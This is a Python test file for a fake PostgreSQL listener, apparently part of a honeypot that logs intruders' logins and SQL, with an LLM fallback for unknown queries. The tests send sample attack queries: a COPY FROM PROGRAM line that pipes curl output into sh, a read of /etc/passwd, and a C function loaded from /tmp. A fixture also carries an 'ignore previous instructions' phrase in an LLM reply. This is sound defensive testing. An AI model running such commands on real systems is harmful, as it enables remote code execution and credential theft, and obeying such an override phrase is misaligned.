"""Loopback tests for the fake PostgreSQL listener (raw protocol 3.0 client)."""

import asyncio
import hashlib
import struct

import pytest

from agents.budget import Budget
from agents.llm import LLMOutputError
from listeners import postgres
from listeners.base import ListenerContext, ServiceSettings
from listeners.events import EventWriter
from listeners.sqlfake import LlmSqlAnswer
from scenarios.loader import LoadedScenario
from scenarios.schema import LoginPolicy, Scenario

POLICY = LoginPolicy(accept="after_n", after_n_min=2, after_n_max=2)


def make_scenario() -> LoadedScenario:
    scn = Scenario.model_validate({
        "name": "t_clinic", "title": "Test clinic", "description": "test",
        "identity": {"org_name": "Northwind Clinic", "hostname": "db01",
                     "domain": "northwind.test", "internal_ips": ["10.20.0.5"],
                     "os_pretty_name": "Ubuntu 22.04.4 LTS",
                     "kernel": "Linux db01 5.15.0-101-generic"},
        "services": {"postgres": {
            "enabled": True, "port": 0,
            "policy": {"accept": "after_n", "after_n_min": 2, "after_n_max": 2},
            "databases": [{"name": "clinic", "tables": [{
                "name": "patients",
                "columns": [{"name": "id", "type": "int"}, {"name": "full_name", "type": "text"},
                            {"name": "mrn", "type": "varchar"}],
                "seed_rows": [[1, "Avery Hartwell", "MRN00000001"],
                              [2, "Jordan Okonkwo", "MRN00000002"],
                              [3, "Riley Lindqvist", "MRN00000003"]]}]}]}},
    })
    return LoadedScenario(scenario=scn, seed="t")


class RaisingLLM:
    def complete_json(self, system, user, schema):
        raise LLMOutputError("bad output")


class FixedLLM:
    def __init__(self, obj):
        self.obj = obj
        self.prompts = []

    def complete_json(self, system, user, schema):
        self.prompts.append(user)
        return self.obj


async def start_server(json_llm=None, auth_method=None, policy=POLICY, accounts=None):
    ctx = ListenerContext(EventWriter(None), scenario=make_scenario(), bind_host="127.0.0.1",
                          budget=Budget() if json_llm else None, json_llm=json_llm)
    settings = ServiceSettings(name="postgres", enabled=True, port=0, policy=policy,
                               accounts=accounts or [], auth_method=auth_method)
    ctx.settings["postgres"] = settings
    servers = await postgres.start(ctx, settings)
    port = servers[0].sockets[0].getsockname()[1]
    return ctx, servers, port


async def stop(servers):
    for s in servers:
        s.close()
        await s.wait_closed()


async def read_msg(r):
    head = await asyncio.wait_for(r.readexactly(5), 5)
    (n,) = struct.unpack("!I", head[1:])
    return head[:1], await r.readexactly(n - 4)


async def read_until(r, stop=(b"Z",)):
    out = []
    while True:
        kind, body = await read_msg(r)
        out.append((kind, body))
        if kind in stop:
            return out


def fields(body):
    out = {}
    for part in body.split(b"\x00"):
        if part:
            out[chr(part[0])] = part[1:].decode()
    return out


def md5_response(user, password, salt):
    inner = hashlib.md5((password + user).encode()).hexdigest()
    return "md5" + hashlib.md5(inner.encode() + salt).hexdigest()


async def connect(port, user, password, db="clinic"):
    r, w = await asyncio.open_connection("127.0.0.1", port)
    w.write(struct.pack("!II", 8, 80877103))
    assert await r.readexactly(1) == b"N"
    params = (b"user\x00" + user.encode() + b"\x00database\x00" + db.encode() +
              b"\x00application_name\x00psql\x00\x00")
    w.write(struct.pack("!II", len(params) + 8, 196608) + params)
    kind, body = await read_msg(r)
    assert kind == b"R"
    code = struct.unpack("!I", body[:4])[0]
    if code == 5:  # AuthenticationMD5Password with a 4-byte salt
        assert len(body) == 8
        pw = md5_response(user, password, body[4:8]).encode() + b"\x00"
    else:
        assert code == 3
        pw = password.encode() + b"\x00"
    w.write(b"p" + struct.pack("!I", len(pw) + 4) + pw)
    msgs = await read_until(r, (b"Z", b"E"))
    return r, w, msgs


async def query(r, w, sql):
    q = sql.encode() + b"\x00"
    w.write(b"Q" + struct.pack("!I", len(q) + 4) + q)
    msgs = await read_until(r)
    cols, rows, tags, errors = [], [], [], []
    for kind, body in msgs:
        if kind == b"T":
            (n,) = struct.unpack("!H", body[:2])
            pos = 2
            for _ in range(n):
                end = body.index(b"\x00", pos)
                cols.append(body[pos:end].decode())
                pos = end + 1 + 18
        elif kind == b"D":
            (n,) = struct.unpack("!H", body[:2])
            pos, row = 2, []
            for _ in range(n):
                (ln,) = struct.unpack("!i", body[pos:pos + 4])
                pos += 4
                if ln < 0:
                    row.append(None)
                else:
                    row.append(body[pos:pos + ln].decode())
                    pos += ln
            rows.append(row)
        elif kind == b"C":
            tags.append(body.rstrip(b"\x00").decode())
        elif kind == b"E":
            errors.append(fields(body))
    return cols, rows, tags, errors


def events(ctx, event):
    return [e for e in ctx.writer.events if e["event"] == event]


async def settle():
    await asyncio.sleep(0.05)


async def test_after_n_then_realistic_session():
    ctx, servers, port = await start_server(auth_method="cleartext")
    try:
        r, w, msgs = await connect(port, "dbadmin", "Winter2025!")
        err = fields(msgs[-1][1])
        assert msgs[-1][0] == b"E" and err["C"] == "28P01"
        assert 'password authentication failed for user "dbadmin"' in err["M"]
        w.close()

        r, w, msgs = await connect(port, "dbadmin", "hunter2")
        kinds = [k for k, _ in msgs]
        assert kinds[0] == b"R" and kinds[-1] == b"Z" and b"K" in kinds
        params = dict(tuple(b.rstrip(b"\x00").decode().split("\x00")) for k, b in msgs if k == b"S")
        assert params["server_version"].startswith("15.6")
        assert params["application_name"] == "psql"

        cols, rows, tags, errs = await query(r, w, "SELECT version()")
        assert cols == ["version"] and rows[0][0].startswith("PostgreSQL 15.6") and not errs
        cols, rows, _, _ = await query(r, w, "select current_user, current_database()")
        assert rows == [["dbadmin", "clinic"]]
        cols, rows, tags, _ = await query(r, w, "SELECT * FROM patients LIMIT 2")
        assert cols == ["id", "full_name", "mrn"] and len(rows) == 2 and tags == ["SELECT 2"]
        assert rows[0] == ["1", "Avery Hartwell", "MRN00000001"]
        cols, rows, _, _ = await query(r, w, "select full_name from patients where id = 3")
        assert rows == [["Riley Lindqvist"]]
        _, rows, _, _ = await query(r, w, "SELECT datname FROM pg_database")
        assert ["clinic"] in rows and ["postgres"] in rows
        _, rows, _, _ = await query(r, w, "SHOW server_version")
        assert rows[0][0].startswith("15.6")
        _, _, tags, errs = await query(
            r, w, "BEGIN; INSERT INTO patients VALUES (4, 'x', 'y'); COMMIT")
        assert tags == ["BEGIN", "INSERT 0 1", "COMMIT"] and not errs
        _, _, _, errs = await query(r, w, "SELECT * FROM nosuchtable")
        assert errs[0]["C"] == "42P01"
        w.write(b"X" + struct.pack("!I", 4))
        await w.drain()
        w.close()
        await settle()
    finally:
        await stop(servers)
    attempts = events(ctx, "auth_attempt")
    assert [(a["username"], a["password"], a["success"]) for a in attempts] == [
        ("dbadmin", "Winter2025!", False), ("dbadmin", "hunter2", True)]
    assert attempts[0]["client"] == "psql" and attempts[0]["data"]["database"] == "clinic"
    stmts = [e["data"]["statement"] for e in events(ctx, "command") if "statement" in e["data"]]
    assert "SELECT version()" in stmts and "SELECT * FROM patients LIMIT 2" in stmts
    assert not events(ctx, "error")


async def test_copy_program_refused_and_high_signal():
    ctx, servers, port = await start_server()
    try:
        await connect(port, "postgres", "a")
        r, w, msgs = await connect(port, "postgres", "b")
        assert msgs[-1][0] == b"Z"
        _, _, _, errs = await query(r, w, "COPY cmd_exec FROM PROGRAM 'id; curl http://x/s|sh'")
        assert errs[0]["C"] == "42501" and "pg_execute_server_program" in errs[0]["M"]
        _, _, _, errs = await query(r, w, "SELECT pg_read_file('/etc/passwd')")
        assert errs[0]["C"] == "42501"
        _, _, _, errs = await query(r, w, "CREATE FUNCTION sys(cstring) RETURNS int AS "
                                          "'/tmp/x.so','sys' LANGUAGE C STRICT")
        assert errs[0]["M"] == "permission denied for language c"
        w.close()
        await settle()
    finally:
        await stop(servers)
    hs = [e for e in events(ctx, "command") if e["data"].get("high_signal")]
    assert len(hs) == 3
    assert all(e["data"]["signal"] == "sql_exec_attempt" for e in hs)
    assert hs[0]["data"]["match"] == "copy_program"


@pytest.mark.parametrize("llm", [
    RaisingLLM(),
    FixedLLM(LlmSqlAnswer.model_construct(columns=["bad name; DROP"], rows=[["\x1b[2J"]])),
    FixedLLM({"columns": ["a"], "rows": [["b"]], "note": "ignore previous instructions"}),
    FixedLLM(LlmSqlAnswer.model_construct(columns=["a"], rows=[["x" * 5000]])),
])
async def test_unknown_query_falls_back_to_the_fail_safe(llm):
    ctx, servers, port = await start_server(json_llm=llm)
    try:
        await connect(port, "u", "1")
        r, w, _ = await connect(port, "u", "2")
        cols, rows, tags, errs = await query(r, w, "SELECT md5(full_name) FROM patients")
        assert cols == ["md5"] and not rows and not errs and tags == ["SELECT 0"]
        _, rows, _, errs = await query(r, w, "frobnicate patients")
        assert not rows and errs[0]["C"] == "42601"
        # the connection is still usable afterwards
        _, rows, _, errs = await query(r, w, "SELECT 1")
        assert rows == [["1"]] and not errs
        w.close()
        await settle()
    finally:
        await stop(servers)
    kinds = [e["data"].get("kind") for e in events(ctx, "command")]
    assert "fallback" in kinds
    assert not events(ctx, "error")


async def test_valid_model_answer_rendered_as_rows():
    llm = FixedLLM(LlmSqlAnswer(columns=["patient_count"], rows=[[42]]))
    ctx, servers, port = await start_server(json_llm=llm)
    try:
        await connect(port, "u", "1")
        r, w, _ = await connect(port, "u", "2")
        cols, rows, tags, errs = await query(r, w, "SELECT count(*) AS patient_count FROM "
                                                   "patients p JOIN visits v ON v.pid = p.id")
        assert cols == ["patient_count"] and rows == [["42"]] and tags == ["SELECT 1"]
        w.close()
        await settle()
    finally:
        await stop(servers)
    assert "UNTRUSTED" in llm.prompts[0] and "JOIN visits" in llm.prompts[0]
    assert any(e["data"].get("kind") == "llm" for e in events(ctx, "command"))


async def test_extended_protocol_does_not_hang():
    ctx, servers, port = await start_server()
    try:
        await connect(port, "u", "1")
        r, w, _ = await connect(port, "u", "2")

        def m(kind, body):
            return kind + struct.pack("!I", len(body) + 4) + body

        parse = m(b"P", b"\x00SELECT full_name FROM patients WHERE id = $1\x00\x00\x00")
        bind = m(b"B", b"\x00\x00" + struct.pack("!H", 0) + struct.pack("!H", 1) +
                 struct.pack("!i", 1) + b"2" + struct.pack("!H", 0))
        describe = m(b"D", b"P\x00")
        execute = m(b"E", b"\x00" + struct.pack("!I", 0))
        sync = m(b"S", b"")
        w.write(parse + bind + describe + execute + sync)
        msgs = await read_until(r)
        kinds = [k for k, _ in msgs]
        assert kinds == [b"1", b"2", b"T", b"D", b"C", b"Z"]
        assert b"Jordan Okonkwo" in msgs[3][1]
        # Bind to a statement that does not exist: error, then ReadyForQuery on Sync.
        w.write(m(b"B", b"\x00nope\x00\x00\x00\x00\x00\x00\x00") + execute + sync)
        msgs = await read_until(r)
        assert [k for k, _ in msgs] == [b"E", b"Z"]
        w.close()
        await settle()
    finally:
        await stop(servers)


async def test_malformed_and_oversized_input_closes_cleanly():
    ctx, servers, port = await start_server()
    try:
        r, w = await asyncio.open_connection("127.0.0.1", port)
        w.write(struct.pack("!I", 0x7FFFFFFF) + b"junk")
        assert await asyncio.wait_for(r.read(), 5) == b""
        w.close()
        r, w = await asyncio.open_connection("127.0.0.1", port)
        w.write(b"GET / HTTP/1.1\r\n\r\n")
        await asyncio.wait_for(r.read(), 5)
        w.close()
        # authenticated client sending an oversized message
        await connect(port, "u", "1")
        r, w, _ = await connect(port, "u", "2")
        w.write(b"Q" + struct.pack("!I", 50_000_000))
        assert await asyncio.wait_for(r.read(), 5) == b""
        w.close()
        await settle()
    finally:
        await stop(servers)
    assert not [e for e in ctx.writer.events if e["message"] == "Handler error"]
    reasons = [e["data"].get("reason") for e in ctx.writer.events if e["event"] in ("error", "limit")]
    assert "startup_length" in reasons and "packet_size" in reasons


async def auth_request(port, user):
    r, w = await asyncio.open_connection("127.0.0.1", port)
    params = b"user\x00" + user.encode() + b"\x00database\x00clinic\x00\x00"
    w.write(struct.pack("!II", len(params) + 8, 196608) + params)
    kind, body = await read_msg(r)
    w.close()
    return kind, body


async def test_md5_is_default_and_consistent_with_settings():
    ctx, servers, port = await start_server()
    try:
        kind, body = await auth_request(port, "u")
        assert kind == b"R" and struct.unpack("!I", body[:4])[0] == 5 and len(body) == 8
        _, other = await auth_request(port, "u")
        assert other[4:] != body[4:]  # fresh random salt per connection
        await connect(port, "dbadmin", "Winter2025!")
        r, w, msgs = await connect(port, "dbadmin", "password")
        assert msgs[-1][0] == b"Z"
        _, rows, _, _ = await query(r, w, "SHOW password_encryption")
        assert rows == [["md5"]]
        _, rows, _, _ = await query(r, w, "SELECT setting FROM pg_settings WHERE "
                                          "name = 'password_encryption'")
        assert rows == [["md5"]]
        w.close()
        await settle()
    finally:
        await stop(servers)
    attempts = [a for a in events(ctx, "auth_attempt") if "password" in a]
    assert [(a["username"], a["password"], a["success"]) for a in attempts] == [
        ("dbadmin", "<unrecovered>", False), ("dbadmin", "password", True)]
    assert all(a["data"]["auth"] == "md5" for a in attempts)
    assert [a["data"]["password_recovered"] for a in attempts] == [False, True]


async def test_md5_unrecovered_password_logs_hash():
    ctx, servers, port = await start_server()
    try:
        r, w, msgs = await connect(port, "svc", "zq-not-in-any-list-91x")
        assert msgs[-1][0] == b"E" and fields(msgs[-1][1])["C"] == "28P01"
        w.close()
        await settle()
    finally:
        await stop(servers)
    a = events(ctx, "auth_attempt")[0]
    assert a["data"]["password_recovered"] is False
    assert a["data"]["md5_response"].startswith("md5") and len(a["data"]["md5_response"]) == 35
    assert len(a["data"]["salt"]) == 8
    assert a["password"] != "zq-not-in-any-list-91x"


async def test_md5_recovers_configured_account_password():
    policy = LoginPolicy(accept="listed")
    ctx, servers, port = await start_server(policy=policy, accounts=[("clinic_app", "N0rthw1nd#Db")])
    try:
        r, w, msgs = await connect(port, "clinic_app", "N0rthw1nd#Db")
        assert msgs[-1][0] == b"Z"
        w.close()
        r, w, msgs = await connect(port, "clinic_app", "wrong")
        assert msgs[-1][0] == b"E"
        w.close()
        await settle()
    finally:
        await stop(servers)
    attempts = events(ctx, "auth_attempt")
    assert attempts[0]["password"] == "N0rthw1nd#Db" and attempts[0]["success"] is True
    assert attempts[1]["success"] is False


async def test_cleartext_flow_selectable():
    ctx, servers, port = await start_server(auth_method="cleartext")
    try:
        kind, body = await auth_request(port, "u")
        assert struct.unpack("!I", body)[0] == 3
        await connect(port, "u", "1")
        r, w, msgs = await connect(port, "u", "2")
        _, rows, _, _ = await query(r, w, "SHOW password_encryption")
        assert rows == [["scram-sha-256"]]
        w.close()
        await settle()
    finally:
        await stop(servers)
    attempts = events(ctx, "auth_attempt")
    assert attempts[-1]["password"] == "2" and attempts[-1]["data"]["auth"] == "cleartext"


async def test_bind_with_bad_lengths_is_protocol_error_not_disconnect():
    ctx, servers, port = await start_server()
    try:
        await connect(port, "u", "1")
        r, w, _ = await connect(port, "u", "2")

        def m(kind, body):
            return kind + struct.pack("!I", len(body) + 4) + body

        parse = m(b"P", b"\x00SELECT 1\x00\x00\x00")
        for bad in (struct.pack("!H", 0) + struct.pack("!H", 1) + struct.pack("!i", 1000) + b"2",
                    struct.pack("!H", 0) + struct.pack("!H", 1) + struct.pack("!i", -5),
                    struct.pack("!H", 65535) + b"\x00\x01",
                    struct.pack("!H", 0) + struct.pack("!H", 3) + struct.pack("!i", 1) + b"1"):
            w.write(parse + m(b"B", b"\x00\x00" + bad) + m(b"S", b""))
            msgs = await read_until(r)
            kinds = [k for k, _ in msgs]
            assert kinds == [b"1", b"E", b"Z"], kinds
            err = fields(msgs[1][1])
            assert err["C"] == "08P01" and err["M"] == "insufficient data left in message"
        _, rows, _, errs = await query(r, w, "SELECT 1")
        assert rows == [["1"]] and not errs
        w.close()
        await settle()
    finally:
        await stop(servers)


def _m(kind, body):
    return kind + struct.pack("!I", len(body) + 4) + body


def _bind(params, fmts=()):
    """Bind to the unnamed statement: params are (bytes or None)."""
    body = b"\x00\x00" + struct.pack("!H", len(fmts)) + b"".join(struct.pack("!H", f) for f in fmts)
    body += struct.pack("!H", len(params))
    for v in params:
        body += struct.pack("!i", -1) if v is None else struct.pack("!i", len(v)) + v
    return _m(b"B", body + struct.pack("!H", 0))


def _sql_events(ctx):
    return [e["data"]["statement"] for e in ctx.writer.events if e["message"] == "SQL statement"]


async def test_bind_parameters_reach_the_engine_bound():
    ctx, servers, port = await start_server()
    try:
        await connect(port, "u", "1")
        r, w, _ = await connect(port, "u", "2")
        parse = _m(b"P", b"\x00SELECT full_name FROM patients WHERE id = $3 AND full_name <> $1 "
                   b"AND note IS DISTINCT FROM $2\x00\x00\x00")
        w.write(parse + _bind([b"O'Brien; --", None, struct.pack("!i", 2)], fmts=(0, 0, 1))
                + _m(b"E", b"\x00" + struct.pack("!I", 0)) + _m(b"S", b""))
        kinds = [k for k, _ in await read_until(r)]
        assert kinds[:2] == [b"1", b"2"] and kinds[-1] == b"Z"
        w.close()
        await settle()
    finally:
        await stop(servers)
    assert _sql_events(ctx) == ["SELECT full_name FROM patients WHERE id = 2 AND full_name <> "
                                "'O''Brien; --' AND note IS DISTINCT FROM NULL"]


async def test_describe_statement_does_not_run_writes_twice():
    ctx, servers, port = await start_server()
    try:
        await connect(port, "u", "1")
        r, w, _ = await connect(port, "u", "2")
        execute = _m(b"E", b"\x00" + struct.pack("!I", 0))
        for sql, tag in ((b"CREATE ROLE backup_svc LOGIN", b"CREATE ROLE"),
                         (b"INSERT INTO patients (full_name) VALUES ($1)", b"INSERT 0 1")):
            # asyncpg / PQdescribePrepared: Parse, Describe statement, Sync; Bind, Execute, Sync.
            w.write(_m(b"P", b"\x00" + sql + b"\x00\x00\x00") + _m(b"D", b"S\x00") + _m(b"S", b""))
            msgs = await read_until(r)
            assert [k for k, _ in msgs] == [b"1", b"t", b"n", b"Z"]
            params = [b"Pat Doe"] if b"$1" in sql else []
            w.write(_bind(params) + execute + _m(b"S", b""))
            msgs = await read_until(r)
            assert [k for k, _ in msgs] == [b"2", b"C", b"Z"], msgs
            assert msgs[1][1].rstrip(b"\x00") == tag
        # A read is still described with its columns, however it is spelled.
        for read in (b"SELECT full_name FROM patients WHERE id = $1", b"SELECT(1)",
                     b"/* x */select*from patients"):
            w.write(_m(b"P", b"\x00" + read + b"\x00\x00\x00") + _m(b"D", b"S\x00")
                    + _m(b"S", b""))
            assert [k for k, _ in await read_until(r)] == [b"1", b"t", b"T", b"Z"], read
        w.close()
        await settle()
    finally:
        await stop(servers)
    logged = _sql_events(ctx)
    assert logged.count("CREATE ROLE backup_svc LOGIN") == 1
    assert logged.count("INSERT INTO patients (full_name) VALUES ('Pat Doe')") == 1
    assert not [s for s in logged if s.startswith("INSERT") and "NULL" in s]
